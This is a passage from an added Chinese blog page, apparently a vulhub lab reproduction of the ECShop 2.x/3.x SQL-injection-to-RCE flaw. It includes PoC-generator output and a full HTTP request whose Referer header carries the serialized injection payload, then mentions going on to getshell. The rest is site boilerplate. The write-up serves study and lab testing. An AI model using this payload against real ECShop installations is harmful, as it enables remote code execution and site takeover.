+echo "\n\nPOC for ECShop 3.x: \n";
+echo "{$hash3}ads|{$s}{$hash3}";
+
+访问http://your-ip:8080是2.7.3安装页面。访问http://your-ip:8081是3.6.0安装页面。都安装它们，mysql地址为mysql，mysql帐户和密码为root，数据库名称可以自由填写，但是2.7.3和3.6.0的数据库名称不能相同。
+
+用kali命令行生成poc：
+
+php ecshop sql rce exp.php
+
+![ECShop1](../images/ECShop1.png)
+
+生成的POC，放在Referer里发送：
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /user.php?act=login HTTP/1.1</span><br><span class="line">Host: your-ip</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Cookie: PHPSESSID=9odrkfn7munb3vfksdhldob2d0; ECS_ID=1255e244738135e418b742b1c9a60f5486aa4559; ECS[visit_times]=1</span><br><span class="line">Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
+
+然后就会回显PHPinfo的内容，进而我们可以进行getshell。
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">hz</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://example.com/2022/07/19/vulhub2/">http://example.com/2022/07/19/vulhub2/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint policy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">hz</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                    <span class="chip bg-color">漏洞复现</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2022/07/19/game-week5/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/7.jpg" class="responsive-img" alt="game--week5">
+                        
+                        <span class="card-title">game--week5</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-07-19
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hz
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/ctf-games/">
+                        <span class="chip bg-color">ctf-games</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/07/10/vulhub%E5%A4%8D%E7%8E%B01/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="vulhub复现1">
+                        
+                        <span class="card-title">vulhub复现1</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-07-10
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            hz
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        display: none;
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        display: none;
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="playlist"
+                   id="503838841"
+                   fixed='true'
+                   autoplay='false'
+                   theme='#42b983'
+                   loop='all'
+                   order='random'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2019-2022</span>
+            
+            <span id="year">2019</span>
+            <a href="/about" target="_blank">hz</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;Total visits:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;Total visitors:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/shianer" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:292595085@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=292595085" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 292595085" data-position="top" data-delay="50">
+        <i class="fab fa-qq"></i>
+    </a>
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
+                            var content = data.content.trim().replace(/<[^>]+>/g, "");
+                            if (first_occur >= 0) {
+                                // cut out 100 characters
+                                var start = first_occur - 20;
+                                var end = first_occur + 80;
+                                if (start < 0) {
+                                    start = 0;
+                                }
+                                if (start === 0) {
+                                    end = 100;
+                                }
+                                if (end > content.length) {
+                                    end = content.length;
+                                }
+                                var match_content = content.substr(start, end);
+                                // highlight all keywords
+                                keywords.forEach(function (keyword) {
+                                    var regS = new RegExp(keyword, "gi");
+                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
+                                });
+
+                                str += "<p class=\"search-result\">" + match_content + "...</p>"
+                            }
+                            str += "</li>";
+                        }
+                    });
+                    str += "</ul>";
+                    $resultContent.innerHTML = str;
+                });
+            }
+        });
+    };
+
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    <!--腾讯兔小巢-->
+    
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
